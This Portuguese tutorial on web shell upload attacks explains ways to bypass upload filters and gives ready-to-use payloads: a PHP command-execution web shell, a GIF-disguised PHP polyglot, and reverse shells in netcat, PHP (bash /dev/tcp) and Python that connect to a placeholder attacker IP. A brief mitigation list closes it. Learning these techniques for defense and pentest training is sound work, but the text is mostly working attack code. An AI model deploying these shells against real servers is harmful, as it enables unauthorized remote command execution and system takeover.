
# Shell Upload

Shell Upload é uma técnica de ataque onde um invasor faz o upload de um arquivo malicioso (web shell) para um servidor web vulnerável. Esse arquivo pode permitir a execução de comandos remotos, obtenção de acesso ao sistema ou escalonamento de privilégios.

---

### Métodos Comuns de Exploração:

- **Exploração de falhas no upload de arquivos** – Alguns sites permitem upload de arquivos sem verificar adequadamente sua extensão ou conteúdo.

- **Alteração de cabeçalhos HTTP** – Manipular cabeçalhos `Content-Type` pode enganar a verificação do servidor.

- **Dupla extensão** – Enviar arquivos como `shell.php.jpg`, dependendo da configuração do servidor.

- **Bypass em filtros de upload** – Modificar a estrutura do arquivo para evitar bloqueios baseados em assinaturas conhecidas.

---

### Burlar validação do site

Os sistemas web normalmente possuem filtros para impedir o upload de arquivos maliciosos, mas muitas vezes esses filtros podem ser contornados. Algumas técnicas incluem:

- **Alteração de extensão**: Alguns servidores permitem a execução de arquivos `.php5`, `.phtml`, `.phar`.

- **Uso de caracteres especiais**: Inserir caracteres como `%00` (null byte) para enganar verificações de extensão.

- **Codificação**: Esconder código malicioso em imagens (`GIF89a;<?php system($_GET['cmd']); ?>`).

- **Uso de arquivos** `.htaccess`: Configurar o servidor para executar scripts em extensões inesperadas.

---

### shell_exec()

A função `shell_exec()` do PHP permite executar comandos no sistema operacional diretamente do código. Se um invasor conseguir fazer upload de um web shell e chamar essa função, ele pode executar qualquer comando no servidor.

Exemplo de uso:

~~~php
<?php
echo shell_exec("whoami");
?>
~~~

*Isso retorna o nome do usuário que está executando o servidor.*

Alternativas perigosas em PHP:

- `system()`

- `exec()`

- `passthru()`

- `comando (backticks)`

---

### Webshell

Uma webshell é um script malicioso carregado em um servidor para permitir que um atacante execute comandos remotamente. Geralmente são desenvolvidos em PHP, ASP, JSP ou Python.

Exemplo de Webshell PHP:

~~~php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
~~~

*Acessando `http://site.com/shell.php?cmd=whoami`, o invasor pode executar comandos diretamente no sistema.*

---

### Shell reversa

Uma shell reversa permite que um invasor controle um servidor comprometido através de uma conexão estabelecida de dentro para fora. Como firewalls geralmente bloqueiam conexões externas, uma shell reversa força o servidor a se conectar à máquina do invasor, contornando restrições.

Exemplo de comando para abrir uma shell reversa em Linux:

~~~bash
nc -e /bin/sh atacante_ip porta
~~~

Ou em PHP:

~~~php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATACANTE_IP/PORTA 0>&1'");
?>
~~~

---

### Python Reverse Shell

Python é muito utilizado para criar shells reversas devido à sua portabilidade.

Exemplo de Shell Reversa em Python:

~~~py
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATACANTE_IP", PORTA))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
~~~

*O código conecta o servidor comprometido ao IP do atacante, redireciona a entrada/saída para o socket e abre um shell interativo.*

---

### Medidas de Mitigação

- Restringir upload de arquivos a tipos seguros (exemplo: `.jpg`, `.png`).

- Validar MIME Type e extensão do arquivo no backend.

- Bloquear a execução de arquivos na pasta de upload.

- Configurar o servidor para evitar execução de scripts em diretórios públicos.

- Monitorar logs e processos suspeitos.

---